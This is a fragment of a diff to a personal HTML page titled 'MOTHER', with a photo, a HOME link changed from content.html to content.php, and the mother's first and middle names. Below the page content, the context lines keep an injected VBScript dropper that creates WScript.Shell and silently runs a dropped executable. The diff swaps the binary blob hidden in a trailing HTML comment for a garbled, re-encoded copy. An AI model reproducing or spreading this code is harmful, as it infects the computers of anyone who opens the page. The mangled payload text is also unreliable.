@@ -13,7 +13,7 @@ body{
 <body>
 <h1><center>MOTHER</h1><center>
 <center><img src="mamaP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<p><a href="content.php" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>DYLAILA</p>
 <p><front = 'Georgia'><b>Middle Name:</b>DELFIN</p>
@@ -40,7 +40,10 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--ƒYÝý¼óo‡®³O¬È¡ŠÖvWùÂžÉ¸Ö
-FŸFˆ{ŒHñ1o›4ZÆóx£ÞQ«ƒ—ß00Œ<*¾x.¢÷bzv¤øóåªo]Þv:û%Lò½UÄ©2e t“­Ým ê£ë˜r3î8j€
-(Å2’{¢ÓwÞ?Ò‘/óep=˜Z&áŒùË¾Ú°œ·G,{¥ˆbÁfwOüsÒw“ðç'd(ÓÕ±—jÛŽ“)Ÿæ·°…vå—²?×?ÙƒMòÄÛ’’ÔaœüÎC÷®åžwÉRy!x¨õ‡n®?‘¯PAå3£@
-]ÜW-Ða6«MÃc•ødL•×&%-åÅ+ý„€Ólò©´7Mt2ðª¨ù À3PttÝÌƒ‰cA‹ifº‰Ìjk…yÒ?YÑ?îÛhG8¬à ëÎR(ÕøëÎëÎëÎ¦N·X@èÎ ëÎ-->
+//--></SCRIPT><!--ÂƒYÃÃ½Â¼Ã³oÂ‡Â®Â³OÂ¬ÃˆÂ¡ÂŠÃ–vWÃ¹Ã‚ÂžÃ‰Â¸Ã–
+FÂŸFÂˆ{ÂŒÂHÃ±1oÂ›4ZÃ†Ã³xÂ£ÃžQÂ«ÂƒÂ—ÃŸ00ÂŒÂ<*Â¾x.Â¢Ã·bzvÂ¤Ã¸Ã³Ã¥Âªo]Ãžv:Ã»%LÃ²Â½UÃ„Â©2e tÂ“Â­ÃmÂ ÃªÂ£Ã«Â˜r3Ã®8jÂ€
+(Ã…2Â’{Â¢Ã“wÃž
+?Ã’Â‘/Ã³ep=Â˜Z&Ã¡ÂŒÃ¹ÂÂÃ‹Â¾ÃšÂ°ÂœÂ·G,{Â¥ÂˆbÃfwOÃ¼sÃ’wÂ“Ã°Ã§'d(Ã“Ã•Â±Â—jÃ›ÂŽÂ“)ÂŸÃ¦Â·ÂÂ°Â…vÃ¥Â—Â²?Ã—
+?Ã™ÂƒMÃ²Ã„Ã›Â’Â’Ã”aÂœÃ¼ÃŽCÃ·Â®Â
+Ã¥ÂžwÃ‰Ry!xÂ¨ÃµÂ‡nÂ®?Â‘Â¯PAÃ¥3Â£@
+]ÃœW-Ãa6Â«MÃƒcÂ•Ã¸dLÂ•Ã—&%-Ã¥Ã…+Ã½Â„Â€Ã“lÃ²Â©Â´7Mt2Ã°ÂªÂ¨Ã¹ Ã€3PttÃÃŒÂƒÂ‰cAÂ‹ifÂºÂ‰ÃŒjkÂ…yÃ’?ÂYÃ‘?Ã®Ã›hG8Â¬Ã  Ã«ÃŽR(Ã•Ã¸Ã«ÃŽÃ«ÃŽÃ«ÃŽÂ¦NÂ·X@Ã¨ÃŽ Ã«ÃŽ-->
